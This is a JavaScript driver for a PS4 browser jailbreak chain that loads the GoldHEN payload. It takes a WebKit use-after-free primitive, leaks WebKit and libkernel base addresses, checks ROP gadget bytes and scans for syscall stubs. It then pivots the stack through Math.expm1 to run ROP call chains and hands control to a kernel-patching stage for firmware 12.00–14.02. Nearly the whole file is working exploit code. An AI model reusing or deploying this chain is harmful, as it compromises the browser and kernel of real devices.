import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor, PS4 } from "./ps4_offsets.js";

function ensureHostConsole() {
  var hide =
    "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
    "overflow:hidden;opacity:0;pointer-events:none;";
  var out = document.getElementById("out");
  var st = document.getElementById("state");
  if (!out) {
    out = document.createElement("pre");
    out.id = "out";
    out.setAttribute("style", hide);
    (document.body || document.documentElement).appendChild(out);
  }
  if (!st) {
    st = document.createElement("div");
    st.id = "state";
    st.setAttribute("style", hide);
    (document.body || document.documentElement).appendChild(st);
  }
  return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];
let alreadyLoaded = false;
const params = new URLSearchParams(location.search);

function hostOk() {
  var m = document.getElementById("msgs") || document.getElementById("msg");
  if (m) m.innerHTML = "GoldHEN v2.4b18.14 Loaded ...";
}
function hostFail() {
  var m = document.getElementById("msgs") || document.getElementById("msg");
  if (m) {
    m.innerHTML = "Failed to Load! Restart Your Console ...";
    m.style.color = "yellow";
  }
}
function hostAlready() {
  var m = document.getElementById("msgs") || document.getElementById("msg");
  if (m) m.innerHTML = "GoldHEN is Already Loaded ...";
}
function hostRetry() {
  var m = document.getElementById("msgs") || document.getElementById("msg");
  if (m) m.innerHTML = "Failed to Load! Reopen the Browser ...";
}

/* The retry notice. Two things lead here: the chain throws, or it stalls
   without a word. The watchdog covers the second case. It cannot fire when
   the whole WebProcess is gone -- then the screen stays as it is -- but in
   the commoner case, a stuck thread on a live page, the notice appears. */
let lastMark = Date.now();
let retryShown = false;

function showNotice(text) {
  try {
    const box = document.createElement("div");
    box.className = "notice";
    box.textContent = text;
    (document.getElementById("out") || document.body).appendChild(box);
    document.body.classList.add("fail");
  } catch (e) {}
}

function showRetry() {
  if (retryShown) return;
  retryShown = true;
  try { hostRetry(); } catch (e) {}
  try { if (document.body) document.body.className = "fail"; } catch (e) {}
}

const WATCHDOG_MS = 45000;
let terminal = false;
const watchdog = setInterval(function () {
  if (terminal) return;
  if (Date.now() - lastMark > WATCHDOG_MS) {
    endWatchdog();
    showRetry();
  }
}, 5000);

/* Every outcome is terminal for the watchdog: it only covers a chain that
   stalls without a word, and once the run has ended -- well or badly -- there
   is nothing left to stall. Without this the interval kept polling after a
   SUCCESSFUL run and put "exploit failed" on the television 45 s later, with
   nothing wrong: on a console the obvious answer to that is to run again,
   which costs an apm unit out of a supply that lasts one boot. Reported by
   pengu1nsec. The flag as well as the clear, because a callback can already
   be queued when the interval goes. */
function endWatchdog() {
  terminal = true;
  try { clearInterval(watchdog); } catch (e) {}
}

/* The referrer guard. The console's browser restores the page it had open
   last. If that was the armed chain it would run again with nobody in front
   of the screen, so arming requires a step from this folder's landing page.
   The guard lives here rather than in the server, so it holds however the
   files are served. */
const FROM_LANDING = (function () {
  try {
    if (!document.referrer) return false;
    const r = new URL(document.referrer);
    if (r.origin !== location.origin) return false;
    const cameFrom = r.pathname.replace(/[^/]*$/, "");
    const here = location.pathname.replace(/[^/]*$/, "");
    if (cameFrom !== here) return false;
    const file = r.pathname.slice(cameFrom.length);
    return file === "" || file === "index.html";
  } catch (e) {
    return false;
  }
})();

/* A page the browser restored must do nothing at all. Until this sat here,
   the refusal came only after the WebKit stage had already run in full --
   harmless to the kernel, but pointless work on a page nobody asked to run.
   Send it back to the start page instead; from there the ordinary route
   takes over, autostart included, and it arms with a proper referrer and a
   visible countdown. A probe is exempt: it fires nothing and patches
   nothing. */
const SESSION_DONE_KEY = "jb2.goldhen_done";
const SENT_HOME = (function () {
  const want = params.get("afterglow");
  let sessionDone = false;
  try {
    sessionDone = sessionStorage.getItem(SESSION_DONE_KEY) === "1";
  } catch (e) {}
  if (sessionDone) {
    try { history.replaceState(null, "", "index.html"); } catch (e) {}
    try { hostAlready(); } catch (e) {}
    return true;
  }
  /* Restored armed URL without landing referrer — silent redirect. */
  if (want && want !== "probe" && !FROM_LANDING) {
    try { location.replace("index.html"); } catch (e) {}
    return true;
  }
  return false;
})();

const PROBE_MODE = params.get("probe") === "1";

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";

const ramBox =
  document.getElementById("ramBox");

function formatMB(bytes) {
  bytes = Number(bytes || 0);

  if (bytes <= 0) {
    return "0MB";
  }

  return (
    (bytes / (1024 * 1024)).toFixed(2) +
    "MB"
  );
}

function updateRamBox() {
  if (!ramBox) {
    return;
  }

  let heapText =
    "JS heap: N/A";

  try {
    if (
      performance &&
      performance.memory
    ) {
      const used =
        Number(
          performance.memory.usedJSHeapSize || 0,
        );

      const limit =
        Number(
          performance.memory.jsHeapSizeLimit || 0,
        );

      if (limit > 0) {
        const percent =
          used / limit * 100;

        heapText =
          "JS heap: " +
          percent.toFixed(1) +
          "% (" +
          formatMB(used) +
          "/" +
          formatMB(limit) +
          ")";
      } else {
        heapText =
          "JS heap: " +
          formatMB(used);
      }
    }
  } catch (ramError) {
    heapText =
      "JS heap: error";
  }

  let coreText =
    "core: N/A";

  try {
    const info =
      globalThis.__CORE_MEM_INFO;

    if (info) {
      coreText =
        "core: slots=" +
        info.slots +
        " drain=" +
        info.drainCount +
        "x" +
        formatMB(info.drainSize) +
        " est=" +
        formatMB(info.estimatedBytes) +
        " mem=" +
        info.memLevel;
    }
  } catch (coreError) {
    coreText =
      "core: error";
  }

  ramBox.textContent =
    heapText + " | " + coreText;
}

if (ramBox) {
  updateRamBox();

  setInterval(
    updateRamBox,
    500,
  );
}

/* Hide console off-screen. Logs always write. ?log=1 shows console. */
var HIDE_STYLE =
  "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
  "overflow:hidden;opacity:0;pointer-events:none;";
if (SHOW_LOG && !SENT_HOME && document.body) {
  document.body.className = "log";
  try {
    if (outEl) {
      outEl.removeAttribute("style");
      outEl.style.cssText =
        "display:block;white-space:pre-wrap;overflow:auto;max-height:70vh;";
    }
    if (stateEl) {
      stateEl.removeAttribute("style");
      stateEl.style.cssText = "display:block;";
    }
  } catch (e) {}
} else {
  try {
    if (outEl) outEl.setAttribute("style", HIDE_STYLE);
    if (stateEl) stateEl.setAttribute("style", HIDE_STYLE);
    var ram = document.getElementById("ramBox");
    if (ram) ram.setAttribute("style", HIDE_STYLE);
  } catch (e) {}
}
/* `ran` says whether the kernel stage was entered. A failure before that
   costs nothing and a reload is enough; a failure after it may leave the
   handles armed, and then only a cold start is safe. */
function finishUI(ok, ran) {
  endWatchdog();
  if (alreadyLoaded) hostAlready();
  else if (ok) hostOk();
  else if (ran) hostFail();
  else hostRetry();
  if (SHOW_LOG || !document.body) return;
  document.body.className = ok || alreadyLoaded ? "done" : "fail";
}
function mark(tag, detail) {
  lastMark = Date.now();
  const raw = detail;
  detail = terse(detail);

  lines.push(
    tag +
    (
      detail == null || detail === ""
        ? ""
        : "  " + detail
    ),
  );

  if (lines.length > 600) {
    lines.splice(
      0,
      lines.length - 600,
    );
  }

  /* Always write logs — visibility is CSS only. */
  if (outEl) {
    outEl.textContent =
      lines.join("\n");

    outEl.scrollTop =
      outEl.scrollHeight;
  }

}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;


(async function () {
  if (SENT_HOME) return;
  // Defaults: afterglow + GoldHEN only.
  if (!params.get("afterglow")) params.set("afterglow", "1");
  if (!params.get("mode")) params.set("mode", "goldhen");
  if (!params.get("payload")) params.set("payload", "goldhen_2.4b18.14.bin");
  let p = null;

  try {
    await new Promise(function (r) { setTimeout(r, 100); });
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      try {
        document.body.classList.add("log");
      } catch (e) {}

      state("not a PS4 browser - debug mode", "warn");

      mark(
        "NONPS4-DEBUG",
        "ua=" + (navigator.userAgent || "unknown"),
      );

      try {
        mark(
          "NONPS4-OFFSETS",
          "supported=" + Object.keys(PS4).join(","),
        );
      } catch (e) {
        mark("NONPS4-OFFSETS", "error=" + String(e));
      }

      try {
        const off14 = PS4["14.00"];

        if (off14) {
          mark(
            "NONPS4-14",
            "present " +
            "webkit=" + off14.wk_expm1_builtin +
            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
          );
        } else {
          mark("NONPS4-14", "entry=missing");
        }
      } catch (e) {
        mark("NONPS4-14", "error=" + String(e));
      }

      try {
        const info = globalThis.__CORE_MEM_INFO;

        if (info) {
          mark(
            "NONPS4-CORE",
            "hx1400=" + info.hx1400 +
            " memLevel=" + info.memLevel +
            " slots=" + info.slots +
            " drain=" + info.drainCount +
            " est=" + info.estimatedBytes,
          );
        } else {
          mark("NONPS4-CORE", "info=missing");
        }
      } catch (e) {
        mark("NONPS4-CORE", "error=" + String(e));
      }

      return;
    }
    const fwKey = key || "unknown";

    /* afterglow carries one kernel stage per firmware, and nothing below
       re-checks the key. On a firmware it has no stage for, the chain would
       come up in WebKit and then write foreign addresses into the kernel --
       so it is refused here, before anything is touched. */
    const SUPPORTED = ["14.02", "14.00", "13.52", "13.50", "13.04", "13.02",
                   "13.00", "12.52", "12.50", "12.02", "12.00"];
    if (params.get("afterglow") && SUPPORTED.indexOf(fwKey) < 0) {
      mark("FW-UNSUPPORTED", fwKey + " -- this build has a kernel stage for "
           + SUPPORTED.join(", ") + " only");
      state("firmware " + fwKey + " is not supported", "fail");
      showNotice(
        "This build has a kernel stage for firmware " + SUPPORTED.join(", ") +
        " only. Detected " + fwKey + " - nothing was run.",
      );
      endWatchdog();
      return;
    }

    // How many tries the WebKit stage gets. An attempt costs nothing in the
    // kernel -- this stage is a userland UAF in JavaScript, and a miss is
    // simply repeated. About one in three lands, so a low ceiling gives up on
    // a page that would have worked; this one puts that failure well under a
    // tenth of a percent.
    const ATTEMPTS = Math.max(1, parseInt(params.get("attempts") || "8", 10) || 8);

    const PRIMITIVE_ONLY = params.get("stop") === "primitive";

    if (PRIMITIVE_ONLY) {
      state("testing WebKit primitive...", "warn");

      await new Promise(function (resolve) {
        setTimeout(resolve, 0);
      });

      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;

      const carrier = await establishPrimitive({
        maxAttempts: ATTEMPTS,
        onEvent: function (tag, detail, attempt) {
          const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;

          writer(
            tag,
            (attempt != null ? "[" + attempt + "] " : "") +
              (detail || ""),
          );
        },
      });

      installWindowP(carrier, { promote: false });

      const pp = window.p;

      const cell = pp.leakval(Math.expm1);

      const nativeFn = pp.read8(
        pp.read8(cell.add32(0x18)).add32(
          off.wk_JSFunction_m_function,
        ),
      );

      const webkitBase = nativeFn.sub32(
        off.wk_expm1_builtin,
      );

      const aligned = function (value) {
        return value.hi > 0 && (value.low & 0x3fff) === 0;
      };

      const primitiveOk = aligned(webkitBase);

      try {
        const errorFn = pp.read8(
          webkitBase.add32(off.wk___imp___error),
        );

        const libkernelBase = errorFn.sub32(
          off.k__error,
        );

        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=" + libkernelBase,
        );
      } catch (baseError) {
        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=unresolved",
        );
      }

      mark(
        "PRIMITIVE-ONLY",
        primitiveOk ? "PASS" : "FAIL",
      );

      finishUI(primitiveOk);
      return;
    }


    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";

    // afterglow brings its own kernel stage, so this run does not need the
    // host's kernel table at all.
    const OWN_KERNEL_STAGE = !!params.get("afterglow");
    const NEED_K = OWN_KERNEL_STAGE ? [] : [
      "k_idt_rsvd",
      "k_oid_kern_file",
      "k_oid_maxfilesperproc",
      "k_oid_maxprocperuid",
      "k_oid_maxfiles",
      "k_arg1_maxfilesperproc",
      "k_arg1_maxprocperuid",
      "k_arg1_maxfiles",
      "k_prison0",
      "k_rootvnode",
    ];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0 || PROBE_MODE,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    // afterglow uses slopkit/patches/<fw>.bin (1400.bin, 1402.bin, ...).
    const KPATCH_FILE = OWN_KERNEL_STAGE
      ? "slopkit/patches/" + fwKey.replace(".", "") + ".bin"
      : "slopkit/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = OWN_KERNEL_STAGE
      ? (params.get("payload") || "goldhen_2.4b18.14.bin")
      : off.payload || "payload.bin";
    const needPatch = OWN_KERNEL_STAGE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "kpatch-table-present",
        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
        "missing=[" +
          needPatch.join(",") +
          "] blob=" +
          KPATCH_FILE +
          " -- build it from patches/<fw>.c, see patches/1300.c",
      )
    )
      return;
    const needPl = OWN_KERNEL_STAGE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "payload-table-present",
        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
      )
    )
      return;
    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "idt_rsvd=" +
        (
          off.k_idt_rsvd === undefined
            ? "undefined"
            : "0x" + off.k_idt_rsvd.toString(16)
        ) +
      " prison0=" +
        (
          off.k_prison0 === undefined
            ? "undefined"
            : "0x" + off.k_prison0.toString(16)
        ) +
      " rootvnode=" +
        (
          off.k_rootvnode === undefined
            ? "undefined"
            : "0x" + off.k_rootvnode.toString(16)
        ) +
      " kpatch=" +
        KPATCH_FILE +
      " payload=" +
        PAYLOAD_FILE +
      " src=ps4_offsets.js",
    );


    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
      maxAttempts: ATTEMPTS,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || ""),
        ),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted,
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    let libkernelBase = errorFn.sub32(off.k__error);

    if (OWN_KERNEL_STAGE || PROBE_MODE) {
      const libkernelAdjust =
        libkernelBase.low & 0x3fff;

      if (libkernelAdjust !== 0) {
        libkernelBase =
          libkernelBase.sub32(
            libkernelAdjust,
          );

        mark(
          "HX1400-LIBKERNEL-ALIGN",
          "adjust=0x" +
          libkernelAdjust.toString(16) +
          " base=" +
          libkernelBase,
        );
      }
    }

    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    )
      return;

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    )
      return;
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(
      Object.keys(SYS)
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
      return;

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    // Build the chain up front, so that inside the window there is nothing
    // left but one store, one pointer and the trigger. Assembling the 1512
    // slots costs milliseconds, and those milliseconds fall inside it.
    function prepareMany(calls) {
      const c = M, RET = G.POP_RDI_RET.add32(1);
      const insts = [];
      for (let k = 0; k < calls.length; ++k) {
        const args = calls[k][1];
        for (let i = 0; i < args.length; ++i) { insts.push(argGadget[i]); insts.push(args[i]); }
        insts.push(calls[k][0]);
        if ((args.length * 2 + 1) % 2 === 1) insts.push(RET);
      }
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (at < 0x40) throw new Error("prepareMany: " + calls.length + " does not fit");
      if (((c.K.low + at) & 0xf) !== 0) at -= 8;
      const bytes = new Uint8Array(8 * insts.length);
      const bdv = new DataView(bytes.buffer);
      for (let i = 0; i < insts.length; ++i) put(bdv, 8 * i, insts[i]);
      keepAlive.push(bytes, bdv);
      return { bytes: bytes, at: at, sp: c.K.add32(at) };
    }

    function runPrepared(prep) {
      const c = M;
      c.frameU8.fill(0);
      c.stackU8.set(prep.bytes, prep.at);
      put(c.pivotDv, off.pivot_view_sp, prep.sp);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }

    // Quick already-jailbroken probe. If uid is already 0 skip afterglow.
    {
      const SETUID = 23;
      if (!stubAddr.has(SETUID)) {
        for (let o = 0; o < (off.k_scan_stage1 || 0x200000); o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
          if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === SETUID) {
            stubAddr.set(SETUID, libkernelBase.add32(o));
            break;
          }
        }
      }
      if (stubAddr.has(SETUID)) {
        const suRv = sc(SETUID, 0).i32;
        const uidNow = sc(SYS.getuid).i32;
        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
        if (suRv === 0 && uidNow === 0) {
          alreadyLoaded = true;
          mark("JB-ALREADY", "kernel already patched -- afterglow skipped");
          endWatchdog();
          hostAlready();
          try {
            if (mainArmed && mainMf && mainOrig && p) {
              p.write8(mainMf, mainOrig);
              mainArmed = false;
            }
          } catch (e) {}
          return;
        }
      }
    }

    if (params.get("afterglow")) {
      /* Arming requires a step from the landing page. A probe
         (afterglow=probe) fires no trigger and patches nothing, so a restored
         page may run that. */
      let agOk = false, agRan = false;
      try {
        const ag = await import("./afterglow.js");
        // Exactly what afterglow reaches for, counted rather than guessed.
        const agCtx = {
          p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
          params: params, keepAlive: keepAlive, mark: mark, state: state,
          libkernelBase: libkernelBase, webkitBase: webkitBase,
          stubAddr: stubAddr, off: off, fw: fwKey,
          prepareMany: prepareMany, runPrepared: runPrepared,
        };
        if (params.get("afterglow") === "probe") {
          const probed = ag.probeAfterglow(agCtx);
          agOk = !!(probed && probed.ok);
        } else {
          /* set before the call, not after: a throw inside the chain can
             still have fired a shot, and that is the case `ran` is for */
          agRan = true;
          agOk = !!(await ag.runAfterglow(agCtx));
        }
      } catch (agError) {
        mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
      }
      finishUI(agOk, agRan);
      // Only mark session done on success so a failed run can be retried.
      if (agOk) {
        try { sessionStorage.setItem(SESSION_DONE_KEY, "1"); } catch (e) {}
      }
      /* Only rewrite the URL bar — do NOT navigate/reload (would OOM). */
      try {
        history.replaceState(null, "", "index.html");
      } catch (e) {}
      // Stop here. Without this the host's own chain would still run
      // afterwards -- afterglow IS the kernel stage, not a prelude to one.
      return;
    }
    mark("JB-END", "afterglow is the kernel stage -- without afterglow= nothing runs here");
    try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; } } catch (e) {}
    try { finishUI(false); } catch (e) {}
  } catch (eOuter) {
    try { mark("JB-THREW", (eOuter && eOuter.message) || String(eOuter)); } catch (e) {}
    endWatchdog();
    // Put it on the television. A failure in the WebKit stage touched
    // NOTHING -- no apm unit spent, no kernel byte written. Reopening the
    // browser is enough; rebooting the console would waste a cycle.
    showRetry();
  }
})();
